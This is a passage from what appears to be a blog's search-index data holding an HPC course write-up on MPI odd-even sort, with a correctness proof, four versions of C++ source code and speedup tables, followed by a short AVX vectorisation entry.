Execution Time Speedup 1 1 100000000 12526.773000 ms 1. 1 2 100000000 6855.037000 ms 1.82738226 1 4 100000000 4097.778000 ms 3.05696721 1 8 100000000 2431.379000 ms 5.15212684 1 16 100000000 1636.223000 ms 7.65590815 2 32 100000000 1177.610000 ms 10.63745468 v1Loop nprocs times + Blocking Communication + Naive Merge节约 AllReduce 的时间, 进行 nprocs 轮排序.Proof of Correctness Reference: Odd–even sort - WikipediaClaimLet $a_1, \\cdots, a_n$ be a sequence of data ordered by &lt;. The odd-even sort algorithm correctly sorts this data in $n$ passes. (A pass here is defined to be a full sequence of odd-even, or even-odd comparisons. The passes occur in order pass 1: odd–even, pass 2: even–odd, etc.)ProofThis proof is based loosely on one by Thomas Worsch.1Since the sorting algorithm only involves comparison-swap operations and is oblivious (the order of comparison-swap operations does not depend on the data), by Knuth's 0-1 sorting principle,23 it suffices to check correctness when each $a_i$ is either 0 or 1. Assume that there are $e$ 1s.Observe that the rightmost 1 can be either in an even or odd position, so it might not be moved by the first odd-even pass. But after the first odd-even pass, the rightmost 1 will be in an even position. It follows that it will be moved to the right by all remaining passes. Since the rightmost one starts in position greater than or equal to $e$, it must be moved at most $n - e$ steps. It follows that it takes at most $n - e + 1$ passes to move the rightmost 1 to its correct position.Now, consider the second rightmost 1. After two passes, the 1 to its right will have moved right by at least one step. It follows that, for all remaining passes, we can view the second rightmost 1 as the rightmost 1. The second rightmost 1 starts in position at least $e - 1$ and must be moved to position at most $n - 1$, so it must be moved at most $(n - 1) - (e - 1) = n - e$ steps. After at most 2 passes, the rightmost 1 will have already moved, so the entry to the right of the second rightmost 1 will be 0. Hence, for all passes after the first two, the second rightmost 1 will move to the right. It thus takes at most $n - e + 2$ passes to move the second rightmost 1 to its correct position.Continuing in this manner, by induction it can be shown that the $i$-th rightmost 1 is moved to its correct position in at most $n - e + i$ passes. Since $i \\leqslant e$, it follows that the $i$-th rightmost 1 is moved to its correct position in at most $n - e + e = n$ passes. The list is thus correctly sorted in $n$ passes. QED.We remark that each pass takes $O(n)$ steps, so this algorithm has $O(n^2)$ complexity.Source Code// odd_even_sort.cpp#include &lt;mpi.h&gt;#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include \"worker.h\"size_t CalcBlockLen(const size_t n, const int nprocs, const int rank) { if (rank &lt; 0) return 0; size_t block_size = ceiling(n, nprocs); size_t IO_offset = block_size * rank; bool out_of_range = IO_offset &gt;= n; return out_of_range ? 0 : std::min(block_size, n - IO_offset);}void Worker::sort() { if (this-&gt;out_of_range) return; std::sort(this-&gt;data, this-&gt;data + this-&gt;block_len); if (this-&gt;nprocs == 1) return; int left_rank = ((this-&gt;rank == 0) ? (-1) : (this-&gt;rank - 1)); size_t left_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, left_rank); int right_rank = ((this-&gt;rank + 1 == this-&gt;nprocs) ? (-1) : (this-&gt;rank + 1)); size_t right_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, right_rank); float* neighbor_data = new float[std::max(left_block_len, right_block_len)]; float* merged_data = new float[this-&gt;block_len]; for (int i = 0; i &lt; nprocs; ++i) { int neighbor_rank = 0; size_t neighbor_block_len = 0; if ((i &amp; 1) ^ ((this-&gt;rank) &amp; 1)) { neighbor_rank = right_rank; neighbor_block_len = right_block_len; } else { neighbor_rank = left_rank; neighbor_block_len = left_block_len; } if (neighbor_block_len == 0) // no neighbor continue; MPI_Status status; if (neighbor_rank == left_rank) { MPI_Sendrecv(/*sendbuf=*/this-&gt;data, /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/neighbor_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/neighbor_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); if (neighbor_data[0] &lt;= this-&gt;data[0]) // no need to merge continue; } else { // neighbor_rank == right_rank MPI_Sendrecv(/*sendbuf=*/this-&gt;data + (this-&gt;block_len - 1), /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/neighbor_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/neighbor_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); if (this-&gt;data[this-&gt;block_len - 1] &lt;= neighbor_data[0]) // no need to merge continue; } MPI_Sendrecv(/*sendbuf=*/this-&gt;data, /*sendcount=*/this-&gt;block_len, /*sendtype=*/MPI_FLOAT, /*dest=*/neighbor_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/neighbor_block_len, /*recvtype=*/MPI_FLOAT, /*source=*/neighbor_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); size_t skip_count = (neighbor_rank == left_rank) ? neighbor_block_len : 0; size_t j = 0, k = 0, l = 0; while (j &lt; neighbor_block_len &amp;&amp; k &lt; this-&gt;block_len &amp;&amp; l &lt; skip_count) { if (neighbor_data[j] &lt; this-&gt;data[k]) { ++j; ++l; } else { ++k; ++l; } } while (j &lt; neighbor_block_len &amp;&amp; l &lt; skip_count) { ++j; ++l; } while (k &lt; this-&gt;block_len &amp;&amp; l &lt; skip_count) { ++k; ++l; } l = 0; while (j &lt; neighbor_block_len &amp;&amp; k &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) { if (neighbor_data[j] &lt; this-&gt;data[k]) { merged_data[l++] = neighbor_data[j++]; } else { merged_data[l++] = this-&gt;data[k++]; } } while (j &lt; neighbor_block_len &amp;&amp; l &lt; this-&gt;block_len) merged_data[l++] = neighbor_data[j++]; while (k &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) merged_data[l++] = this-&gt;data[k++]; std::memcpy(this-&gt;data, merged_data, (this-&gt;block_len) * sizeof(float)); } delete[] neighbor_data; delete[] merged_data;}Performance Number of Nodes Number of Tasks Number Count Execution Time Speedup 1 1 100000000 12511.503000 ms 1. 1 2 100000000 6816.121000 ms 1.83557525 1 4 100000000 3940.129000 ms 3.17540441 1 8 100000000 2236.570000 ms 5.59405831 1 16 100000000 1402.828000 ms 8.91877194 2 16 100000000 969.002000 ms 12.91174115 v2Loop nprocs times + Blocking Communication + Optimized MergeOptimized Merge左侧 Worker 从左向右 Merge, 右侧 Worker 从右向左 Merge.Source Code// odd_even_sort.cpp#include &lt;mpi.h&gt;#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include \"worker.h\"size_t CalcBlockLen(const size_t n, const int nprocs, const int rank) { if (rank &lt; 0) return 0; size_t block_size = ceiling(n, nprocs); size_t IO_offset = block_size * rank; bool out_of_range = IO_offset &gt;= n; return out_of_range ? 0 : std::min(block_size, n - IO_offset);}void Worker::sort() { if (this-&gt;block_len == 0) return; std::sort(this-&gt;data, this-&gt;data + this-&gt;block_len); if (this-&gt;nprocs == 1) return; int left_rank = ((this-&gt;rank == 0) ? (-1) : (this-&gt;rank - 1)); size_t left_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, left_rank); int right_rank = ((this-&gt;rank + 1 == this-&gt;nprocs) ? (-1) : (this-&gt;rank + 1)); size_t right_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, right_rank); float* neighbor_data = new float[std::max(left_block_len, right_block_len)]; float* merged_data = new float[this-&gt;block_len]; MPI_Status status; for (int i = 0; i &lt; nprocs; ++i) { if ((i &amp; 1) ^ ((this-&gt;rank) &amp; 1)) { if (right_block_len == 0) // no neighbor continue; MPI_Sendrecv(/*sendbuf=*/this-&gt;data + (this-&gt;block_len - 1), /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/right_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/right_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); if (this-&gt;data[this-&gt;block_len - 1] &lt;= neighbor_data[0]) // no need to merge continue; MPI_Sendrecv(/*sendbuf=*/this-&gt;data, /*sendcount=*/this-&gt;block_len, /*sendtype=*/MPI_FLOAT, /*dest=*/right_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/right_block_len, /*recvtype=*/MPI_FLOAT, /*source=*/right_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); size_t j = 0, k = 0, l = 0; while (j &lt; this-&gt;block_len &amp;&amp; k &lt; right_block_len &amp;&amp; l &lt; this-&gt;block_len) { if (this-&gt;data[j] &lt; neighbor_data[k]) { merged_data[l++] = this-&gt;data[j++]; } else { merged_data[l++] = neighbor_data[k++]; } } while (j &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) merged_data[l++] = this-&gt;data[j++]; while (k &lt; right_block_len &amp;&amp; l &lt; this-&gt;block_len) merged_data[l++] = neighbor_data[k++]; } else { if (left_block_len == 0) // no neighbor continue; MPI_Sendrecv(/*sendbuf=*/this-&gt;data, /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/left_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/left_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); if (neighbor_data[0] &lt;= this-&gt;data[0]) // no need to merge continue; MPI_Sendrecv(/*sendbuf=*/this-&gt;data, /*sendcount=*/this-&gt;block_len, /*sendtype=*/MPI_FLOAT, /*dest=*/left_rank, /*sendtag=*/i, /*recvbuf=*/neighbor_data, /*recvcount=*/left_block_len, /*recvtype=*/MPI_FLOAT, /*source=*/left_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/&amp;status); int j = left_block_len - 1, k = this-&gt;block_len - 1, l = this-&gt;block_len - 1; while (j &gt; -1 &amp;&amp; k &gt; -1 &amp;&amp; l &gt; -1) { if (neighbor_data[j] &lt; this-&gt;data[k]) { merged_data[l--] = this-&gt;data[k--]; } else { merged_data[l--] = neighbor_data[j--]; } } while (j &gt; -1 &amp;&amp; l &gt; -1) merged_data[l--] = neighbor_data[j--]; while (k &gt; -1 &amp;&amp; l &gt; -1) merged_data[l--] = this-&gt;data[k--]; } std::memcpy(this-&gt;data, merged_data, (this-&gt;block_len) * sizeof(float)); } delete[] neighbor_data; delete[] merged_data;}Performace Number of Nodes Number of Tasks Number Count Execution Time Speedup 1 1 100000000 12513.623000 ms 1. 1 2 100000000 6665.909000 ms 1.8772568 1 4 100000000 3712.588000 ms 3.37059297 1 8 100000000 2073.758000 ms 6.03427353 1 16 100000000 1295.445000 ms 9.65970998 2 32 100000000 851.194000 ms 14.70125847 v3Loop nprocs times + Non-Blocking Communication + Optimized Merge + Lazy CopyLazy Copy不必每次 Merge 后都将 Merge 的结果拷贝到原 data 中, 而是可以使用两个数组交替作为 \"旧数据\" 和 \"新数据\", 只需交换指针即可.Source Code// odd_even_sort.cpp#include &lt;mpi.h&gt;#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include \"worker.h\"size_t CalcBlockLen(const size_t n, const int nprocs, const int rank) { if (rank &lt; 0) return 0; size_t block_size = ceiling(n, nprocs); size_t IO_offset = block_size * rank; bool out_of_range = IO_offset &gt;= n; return out_of_range ? 0 : std::min(block_size, n - IO_offset);}void Worker::sort() { if (this-&gt;block_len == 0) return; std::sort(this-&gt;data, this-&gt;data + this-&gt;block_len); if (this-&gt;nprocs == 1) return; int left_rank = ((this-&gt;rank == 0) ? (-1) : (this-&gt;rank - 1)); size_t left_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, left_rank); int right_rank = ((this-&gt;rank + 1 == this-&gt;nprocs) ? (-1) : (this-&gt;rank + 1)); size_t right_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, right_rank); float* neighbor_data = new float[std::max(left_block_len, right_block_len)]; float* data_copy = new float[this-&gt;block_len]; MPI_Request requests[2]; for (int i = 0; i &lt; nprocs; ++i) { if ((i &amp; 1) ^ ((this-&gt;rank) &amp; 1)) { if (right_block_len == 0) // no neighbor continue; MPI_Sendrecv(/*sendbuf=*/&amp;(this-&gt;data[this-&gt;block_len - 1]), /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/right_rank, /*sendtag=*/i, /*recvbuf=*/&amp;(neighbor_data[0]), /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/right_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); if (this-&gt;data[this-&gt;block_len - 1] &lt;= neighbor_data[0]) { // no need to merge continue; } MPI_Isend(/*buf=*/this-&gt;data, /*count=*/this-&gt;block_len, /*datatype=*/MPI_FLOAT, /*dest=*/right_rank, /*tag=*/i, /*comm=*/MPI_COMM_WORLD, /*request=*/&amp;requests[0]); MPI_Irecv(/*buf=*/neighbor_data, /*count=*/right_block_len, /*datatype=*/MPI_FLOAT, /*source=*/right_rank, /*tag=*/i, /*comm=*/MPI_COMM_WORLD, /*request=*/&amp;requests[1]); size_t j = 0, k = 0, l = 0; MPI_Wait(/*request=*/&amp;requests[1], /*status=*/MPI_STATUS_IGNORE); while (j &lt; this-&gt;block_len &amp;&amp; k &lt; right_block_len &amp;&amp; l &lt; this-&gt;block_len) { if (this-&gt;data[j] &lt; neighbor_data[k]) { data_copy[l++] = this-&gt;data[j++]; } else { data_copy[l++] = neighbor_data[k++]; } } while (j &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) data_copy[l++] = this-&gt;data[j++]; while (k &lt; right_block_len &amp;&amp; l &lt; this-&gt;block_len) data_copy[l++] = neighbor_data[k++]; } else { if (left_block_len == 0) // no neighbor continue; MPI_Sendrecv(/*sendbuf=*/&amp;(this-&gt;data[0]), /*sendcount=*/1, /*sendtype=*/MPI_FLOAT, /*dest=*/left_rank, /*sendtag=*/i, /*recvbuf=*/&amp;(neighbor_data[left_block_len - 1]), /*recvcount=*/1, /*recvtype=*/MPI_FLOAT, /*source=*/left_rank, /*recvtag=*/i, /*comm=*/MPI_COMM_WORLD, /*status=*/MPI_STATUS_IGNORE); if (neighbor_data[left_block_len - 1] &lt;= this-&gt;data[0]) // no need to merge continue; MPI_Isend(/*buf=*/this-&gt;data, /*count=*/this-&gt;block_len, /*datatype=*/MPI_FLOAT, /*dest=*/left_rank, /*tag=*/i, /*comm=*/MPI_COMM_WORLD, /*request=*/&amp;requests[0]); MPI_Irecv(/*buf=*/neighbor_data, /*count=*/left_block_len, /*datatype=*/MPI_FLOAT, /*source=*/left_rank, /*tag=*/i, /*comm=*/MPI_COMM_WORLD, /*request=*/&amp;requests[1]); int j = left_block_len - 1, k = this-&gt;block_len - 1, l = this-&gt;block_len - 1; MPI_Wait(/*request=*/&amp;requests[1], /*status=*/MPI_STATUS_IGNORE); while (j &gt; -1 &amp;&amp; k &gt; -1 &amp;&amp; l &gt; -1) { if (neighbor_data[j] &lt; this-&gt;data[k]) { data_copy[l--] = this-&gt;data[k--]; } else { data_copy[l--] = neighbor_data[j--]; } } while (j &gt; -1 &amp;&amp; l &gt; -1) data_copy[l--] = neighbor_data[j--]; while (k &gt; -1 &amp;&amp; l &gt; -1) data_copy[l--] = this-&gt;data[k--]; } MPI_Wait(/*request=*/&amp;requests[0], /*status=*/MPI_STATUS_IGNORE); std::memcpy(this-&gt;data, data_copy, (this-&gt;block_len) * sizeof(float)); } delete[] neighbor_data; delete[] data_copy;}Performance Number of Nodes Number of Tasks Number Count Execution Time Speedup 1 1 100000000 12509.441000 ms 1. 1 2 100000000 6715.725000 ms 1.86270894 1 4 100000000 3682.796000 ms 3.39672385 1 8 100000000 2033.162000 ms 6.15270254 1 16 100000000 1212.278000 ms 10.31895407 2 32 100000000 797.821000 ms 15.67950831 v4采用类似 Buffered Stream 方式边计算边发送, 即每计算 chunk_size 个 float 后就进行一次 Isend, 使得通信能够尽可能与计算重叠. 其中, send_right_buffer 和 recv_left_buffer 采取逆向存储, 以符合逆向归并的读写顺序. 为了尽可能缩短阻塞通信的时长, 仅在将要使用某一个 buffer 时才对该 buffer 进行 Waitall 确保上一轮通信已完成.Bandwidth$ srun -N 1 -n 2 osu_bw# OSU MPI Bandwidth Test v5.6.3# Size Bandwidth (MB/s)1 9.472 18.544 38.208 76.2816 152.3832 286.0864 598.25128 382.26256 764.46512 1518.651024 2471.402048 3541.914096 4986.578192 6506.4616384 5481.3232768 7418.9265536 10191.21131072 12052.71262144 12183.31524288 11554.381048576 11871.982097152 12109.494194304 12458.68选取 131072 作为 chunk_size.Source Code// odd_even_sort.cpp#include &lt;mpi.h&gt;#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;queue&gt;#include \"worker.h\"#ifdef DEBUG// void PrintData(const float* data, const int count) {// for (int i = 0; i &lt; count; ++i) printf(\"%f, \", data[i]);// }#endiftemplate &lt;class T = float&gt;class MPIStream { public: MPIStream(const int capacity = 0, MPI_Datatype datatype = MPI_FLOAT, MPI_Comm comm = MPI_COMM_WORLD) : datatype_(datatype), comm_(comm), target_(-1) { this-&gt;chunk_count_ = CalcChunkCount(capacity); this-&gt;data_ = new T[this-&gt;chunk_count_ &lt;&lt; kLogChunkSize]; this-&gt;requests_ = new MPI_Request[this-&gt;chunk_count_]; std::fill(this-&gt;requests_, this-&gt;requests_ + this-&gt;chunk_count_, MPI_REQUEST_NULL); } ~MPIStream() { delete[] this-&gt;data_; delete[] this-&gt;requests_; } virtual T Get(const int pos = 0) { return this-&gt;data_[pos]; } virtual T ReverseGet(const int pos = 0) { return this-&gt;Get(this-&gt;size_ - pos - 1); } virtual void Put(const T&amp; value, const int pos = 0) { this-&gt;data_[pos] = value; } virtual void ReversePut(const T&amp; value, const int pos = 0) { this-&gt;Put(value, this-&gt;size_ - pos - 1); } T* Data() { return this-&gt;data_; } void Connect(int target, const int size = 0) { this-&gt;target_ = target; this-&gt;size_ = size; this-&gt;chunk_count_ = CalcChunkCount(size); } void CancelAll() { for (int i = 0; i &lt; this-&gt;chunk_count_; ++i) MPI_Cancel(&amp;(this-&gt;requests_[i])); } int Waitall() { return MPI_Waitall( /*count=*/this-&gt;chunk_count_, /*array_of_requests=*/this-&gt;requests_, /*array_of_statuses=*/MPI_STATUSES_IGNORE); }#ifdef DEBUG public:#else protected:#endif static int CalcChunkCount(const int size) { return ((size + kChunkSizeMask) &gt;&gt; kLogChunkSize); } static constexpr int kLogChunkSize = 17; static constexpr int kChunkSize = (1 &lt;&lt; kLogChunkSize); static constexpr int kChunkSizeMask = (kChunkSize - 1);#ifdef DEBUG public:#else protected:#endif T* data_; MPI_Datatype datatype_; MPI_Comm comm_; MPI_Request* requests_; int size_, chunk_count_; int target_;};template &lt;class T = float&gt;class MPIInStream : public MPIStream&lt;T&gt; { public: MPIInStream(const int capacity = 0, MPI_Datatype datatype = MPI_FLOAT, MPI_Comm comm = MPI_COMM_WORLD) : MPIStream&lt;T&gt;(capacity, datatype, comm) {} virtual T Get(const int pos) override { if (this-&gt;target_ == -1) return this-&gt;data_[pos]; int chunk_id = (pos &gt;&gt; kLogChunkSize); MPI_Wait(/*request=*/&amp;(this-&gt;requests_[chunk_id]), /*status=*/MPI_STATUS_IGNORE); return this-&gt;data_[pos]; } void Irecv() { if (this-&gt;target_ == -1) return; for (int i = 0; i &lt; this-&gt;chunk_count_; ++i) {#ifdef DEBUG // int rank; // MPI_Comm_rank(MPI_COMM_WORLD, &amp;rank); // printf( // \"Irecv rank = %d, buf_pos = %d, count = %d, source = %d, tag = // %d\\n\", rank, i &lt;&lt; kLogChunkSize, kChunkSize, this-&gt;target_, i);#endif MPI_Irecv(/*buf=*/this-&gt;data_ + (i &lt;&lt; kLogChunkSize), /*count=*/kChunkSize, /*datatype=*/this-&gt;datatype_, /*source=*/this-&gt;target_, /*tag=*/i, /*comm=*/this-&gt;comm_, /*request=*/&amp;(this-&gt;requests_[i])); } } void ConnectSource(int source, const int size = 0) { this-&gt;Connect(/*target=*/source, /*size=*/size); }#ifdef DEBUG public:#else protected:#endif using MPIStream&lt;T&gt;::kLogChunkSize; using MPIStream&lt;T&gt;::kChunkSize; using MPIStream&lt;T&gt;::kChunkSizeMask;};template &lt;class T = float&gt;class MPIOutStream : public MPIStream&lt;T&gt; { public: MPIOutStream(const int capacity = 0, MPI_Datatype datatype = MPI_FLOAT, MPI_Comm comm = MPI_COMM_WORLD) : MPIStream&lt;T&gt;(capacity, datatype, comm) {} void Load(const T* buffer, int count) { std::memcpy(this-&gt;data_, buffer, count * sizeof(T)); } void Reverse() { std::reverse(this-&gt;data_, this-&gt;data_ + this-&gt;size_); } void Isend() { if (this-&gt;target_ == -1) return; for (int i = 0; i &lt; this-&gt;chunk_count_; ++i) {#ifdef DEBUG // int rank; // MPI_Comm_rank(MPI_COMM_WORLD, &amp;rank); // printf(\"Isend rank = %d, buf_pos = %d, count = %d, dest = %d, tag = // %d\\n\", // rank, i &lt;&lt; kLogChunkSize, kChunkSize, this-&gt;target_, i);#endif MPI_Isend( /*buf=*/this-&gt;data_ + (i &lt;&lt; kLogChunkSize), /*count=*/kChunkSize, /*datatype=*/this-&gt;datatype_, /*dest=*/this-&gt;target_, /*tag=*/i, /*comm=*/this-&gt;comm_, /*request=*/&amp;(this-&gt;requests_[i])); } } virtual void Put(const T&amp; value, const int pos = 0) override { if (this-&gt;target_ == -1) return this-&gt;MPIStream&lt;T&gt;::Put(value, pos); this-&gt;data_[pos] = value; if ((((pos + 1) &amp; kChunkSizeMask) == 0) || (pos == this-&gt;size_ - 1)) { int chunk_id = (pos &gt;&gt; kLogChunkSize);#ifdef DEBUG // int rank; // MPI_Comm_rank(MPI_COMM_WORLD, &amp;rank); // printf(\"Isend rank = %d, buf_pos = %d, count = %d, dest = %d, tag = // %d\\n\", // rank, chunk_id &lt;&lt; kLogChunkSize, kChunkSize, this-&gt;target_, // chunk_id);#endif MPI_Isend( /*buf=*/this-&gt;data_ + (chunk_id &lt;&lt; kLogChunkSize), /*count=*/kChunkSize, /*datatype=*/this-&gt;datatype_, /*dest=*/this-&gt;target_, /*tag=*/chunk_id, /*comm=*/this-&gt;comm_, /*request=*/&amp;(this-&gt;requests_[chunk_id])); } } void ConnectDest(int dest, const int size = 0) { this-&gt;Connect(/*target=*/dest, /*size=*/size); }#ifdef DEBUG public:#else protected:#endif using MPIStream&lt;T&gt;::kLogChunkSize; using MPIStream&lt;T&gt;::kChunkSize; using MPIStream&lt;T&gt;::kChunkSizeMask;};size_t CalcBlockLen(const size_t n, const int nprocs, const int rank) { if (rank &lt; 0) return 0; size_t block_size = ceiling(n, nprocs); size_t IO_offset = block_size * rank; bool out_of_range = IO_offset &gt;= n; return out_of_range ? 0 : std::min(block_size, n - IO_offset);}void Worker::sort() { if (this-&gt;block_len == 0) return; std::sort(this-&gt;data, this-&gt;data + this-&gt;block_len); if (this-&gt;nprocs == 1) return;#ifdef DEBUG // printf(\"[%d] begin: \", this-&gt;rank); // for (size_t i = 0; i &lt; this-&gt;block_len; ++i) printf(\"%f, \", // this-&gt;data[i]); printf(\"\\n\");#endif int left_rank = ((this-&gt;rank == 0) ? (-1) : (this-&gt;rank - 1)); int right_rank = ((this-&gt;rank + 1 == this-&gt;nprocs) ? (-1) : (this-&gt;rank + 1)); size_t left_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, left_rank); if (left_block_len == 0) left_rank = -1; size_t right_block_len = CalcBlockLen(this-&gt;n, this-&gt;nprocs, right_rank); if (right_block_len == 0) right_rank = -1; auto send_left_buffer = MPIOutStream&lt;&gt;(/*capacity=*/this-&gt;block_len); send_left_buffer.ConnectDest(/*dest=*/left_rank, /*size=*/this-&gt;block_len); send_left_buffer.Load(this-&gt;data, this-&gt;block_len); auto send_right_buffer = MPIOutStream&lt;&gt;(/*capacity=*/this-&gt;block_len); send_right_buffer.ConnectDest(/*dest=*/right_rank, /*size=*/this-&gt;block_len); send_right_buffer.Load(this-&gt;data, this-&gt;block_len); send_right_buffer.Reverse(); auto recv_left_buffer = MPIInStream&lt;&gt;(/*capacity=*/left_block_len); recv_left_buffer.ConnectSource(/*source=*/left_rank, /*size=*/left_block_len); auto recv_right_buffer = MPIInStream&lt;&gt;(/*capacity=*/right_block_len); recv_right_buffer.ConnectSource(/*source=*/right_rank, /*size=*/right_block_len); if (this-&gt;rank &amp; 1) { send_right_buffer.Isend(); } else { send_left_buffer.Isend(); } for (int i = 0; i &lt; this-&gt;nprocs; ++i) { // printf(\"!!! Rank = %d, i = %d\\n\", this-&gt;rank, i); if ((i ^ this-&gt;rank) &amp; 1) { // recv from right, send to left send_left_buffer.Waitall(); if (i == this-&gt;nprocs - 1) send_left_buffer.ConnectDest(/*dest=*/-1); if (right_block_len == 0) { send_left_buffer.Load(send_right_buffer.Data(), this-&gt;block_len); send_left_buffer.Reverse(); send_left_buffer.Isend(); } else { recv_right_buffer.Waitall(); recv_right_buffer.Irecv(); size_t j = 0, k = 0, l = 0; while (j &lt; this-&gt;block_len &amp;&amp; k &lt; right_block_len &amp;&amp; l &lt; this-&gt;block_len) { if (send_right_buffer.ReverseGet(j) &lt; recv_right_buffer.Get(k)) { send_left_buffer.Put(send_right_buffer.ReverseGet(j++), l++); } else { send_left_buffer.Put(recv_right_buffer.Get(k++), l++); } } while (j &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) send_left_buffer.Put(send_right_buffer.ReverseGet(j++), l++); while (k &lt; right_block_len &amp;&amp; l &lt; this-&gt;block_len) send_left_buffer.Put(recv_right_buffer.Get(k++), l++); } } else { // recv from left, send to right send_right_buffer.Waitall(); if (i == this-&gt;nprocs - 1) send_right_buffer.ConnectDest(/*dest=*/-1); if (left_block_len == 0) { send_right_buffer.Load(send_left_buffer.Data(), this-&gt;block_len); send_right_buffer.Reverse(); send_right_buffer.Isend(); } else { recv_left_buffer.Waitall(); recv_left_buffer.Irecv(); size_t j = 0, k = 0, l = 0; while (j &lt; this-&gt;block_len &amp;&amp; k &lt; left_block_len &amp;&amp; l &lt; this-&gt;block_len) { if (send_left_buffer.ReverseGet(j) &gt; recv_left_buffer.Get(k)) { send_right_buffer.Put(send_left_buffer.ReverseGet(j++), l++); } else { send_right_buffer.Put(recv_left_buffer.Get(k++), l++); } } while (j &lt; this-&gt;block_len &amp;&amp; l &lt; this-&gt;block_len) send_right_buffer.Put(send_left_buffer.ReverseGet(j++), l++); while (k &lt; left_block_len &amp;&amp; l &lt; this-&gt;block_len) send_right_buffer.Put(recv_left_buffer.Get(k++), l++); } } } if ((this-&gt;rank ^ this-&gt;nprocs) &amp; 1) { std::memcpy(this-&gt;data, send_right_buffer.Data(), this-&gt;block_len * sizeof(float)); std::reverse(this-&gt;data, this-&gt;data + this-&gt;block_len); } else { std::memcpy(this-&gt;data, send_left_buffer.Data(), this-&gt;block_len * sizeof(float)); } send_left_buffer.Waitall(); send_right_buffer.Waitall(); recv_left_buffer.Waitall(); recv_right_buffer.Waitall();#ifdef DEBUG // printf(\"[%d] end send_left: \", this-&gt;rank); // PrintData(send_left_buffer.Data(), this-&gt;block_len); // printf(\"\\n\"); // printf(\"[%d] end send_right: \", this-&gt;rank); // PrintData(send_right_buffer.Data(), this-&gt;block_len); // printf(\"\\n\"); // printf(\"[%d] end recv_left: \", this-&gt;rank); // PrintData(recv_left_buffer.Data(), left_block_len); // printf(\"\\n\"); // printf(\"[%d] end recv_right: \", this-&gt;rank); // PrintData(recv_right_buffer.Data(), right_block_len); // printf(\"\\n\");#endif}Performance由于逻辑变得复杂, 效果非常不理想. Number of Nodes Number of Tasks Number Count Execution Time Speedup 1 1 100000000 12483.309000 ms 1. 1 2 100000000 7433.843000 ms 1.67925379 1 4 100000000 5337.546000 ms 2.3387731 1 8 100000000 3785.481000 ms 3.29768106 1 16 100000000 2839.709000 ms 4.39598177 2 32 100000000 2490.944000 ms 5.01147717 \"Five Lectures on CA\" (PDF). Liinwww.ira.uka.de. Retrieved 2017-07-30. &#8617; Lang, Hans Werner. \"The 0-1-principle\". Iti.fh-flensburg.de. Retrieved 30 July 2017. &#8617; \"Distributed Sorting\" (PDF). Net.t-labs.tu-berlin.de. Retrieved 2017-07-30. &#8617; " }, { "title": "exp4: 自动向量化与基于 intrinsic 的手动向量化", "url": "/course-work/introduction-to-high-performance-computing/2022/04/04/exp4-%E8%87%AA%E5%8A%A8%E5%90%91%E9%87%8F%E5%8C%96%E4%B8%8E%E5%9F%BA%E4%BA%8E-intrinsic-%E7%9A%84%E6%89%8B%E5%8A%A8%E5%90%91%E9%87%8F%E5%8C%96/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, intrinsic", "date": "2022-04-04 00:00:00 +0800", "snippet": "Performance Method Time baseline 4711 us auto simd 530 us intrinsic 514 us Implementationvoid a_plus_b_intrinsic(float* a, float* b, float* c, int n) { for (int i = 0; i &lt; n; i += 8) { _mm256_store_ps( c + i, _mm256_add_ps(_mm256_load_ps(a + i), _mm256_load_ps(b + i))); }}" }, { "title": "Bomb Lab: strings not equal", "url": "/course-work/computer-organization-and-architecture/2022/04/04/strings_not_equal/", "categories": "Course Work, Computer Organization and Architecture", "tags": "Bomb Lab", "date": 